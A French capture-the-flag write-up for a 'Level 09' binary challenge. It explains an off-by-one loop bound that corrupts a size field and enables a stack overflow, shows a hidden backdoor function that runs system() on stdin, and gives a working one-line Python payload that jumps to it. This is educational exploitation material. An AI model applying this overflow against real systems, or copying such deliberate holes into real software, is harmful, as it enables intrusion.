# Level 09

Voilà un petit résumé de ce que fait le programme, en incluant les éventuelles attaques possible.

## Lire le nom d'utilisateur

La première chose que le programme fait, c'est lire un nom d'utilisateur. La fonction
`fgets` ne pause pas de problème, elle est correctement protégée. Le soucis, c'est dans la copie
du buffer vers une structure globale.

```c
struct s_data {
    char    message[140];
    char    username[40];
    int     message_size;
};


void main(void) {
    struct s_data data;
    data.message_size = 140;

    char buf[128];

    fgets(buf, 128, stdin);
    for (int i = 0; i <= 40 && buf[i]; i++)
        data.username[i] = buf[i];
}
```

On peut voir ici une erreur dans la condition d'arrêt de la boucle: `i <= 40` à la place de
`i < 40`. Cela signifie que si l'on entre plus de 40 charactères dans notre nom d'utilisateur, l'un
des caractères va être écrit dans le field suivant `username`. Dans notre cas, c'est l'octet de poid
faible de `message_size`.

Par défaut, `message_size` est initializé à 140. Mais en écrivant un caractère particulier, on peut
choisir n'importe quelle valeur entre 0 et 255.

## Lire le message

La seconde partie du programme a pour but de lire un message qui sera copié dans le field `message`.

Cette fois, aucun bug. La lecture du message est correctement protégée, et la copie se fait du bon
nombre de caractères. Le soucis, c'est que l'opération précédente a corrompu la taille du message.

```c
void main(void) {
    /* ... */

    char buf[1024];

    fgets(buf, 1024, stdin);
    for (int i = 0; i < data.message_size && buf[i]; i++)
        data.message[i] = buf[i];
}
```

La taille totale de la structure est 184 octets. Cela signifie qu'une taille de message
supérieure à 184 va écraser une partie de la stack. Et éventuellement atteindre une adresse de
retour.

On peut trouver que 200 octets de message permettent d'atteindre cette addresse.

## Porte dérobée

En affichant la liste des symboles, on peut trouver un symbol appelé `secret_backdoor`. La
décompilation de cette fonction donne:

```c
void secret_backdoor(void) {
    var buf[128];
    fgets(buf, 128, stdin);
    system(buf);
}
```

L'adresse de cette fonction est `0x000055555555488c`.

## Solution

- 40 'A' pour remplir le nom d'utilisateur.
- 0xD0 (208 en hexa) pour la taille du buffer de message
- `\n` pour terminer l'input du nom d'utilisateur
- 200 'A' pour atteindre l'adresse de retour
- '\x8c\x48\x55\x55\x55\x55\x00\x00' L'adresse de `secret_backdoor`.

```sh
python -c "print('A' * 40 + '\xD0\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00')" | ./level09
```
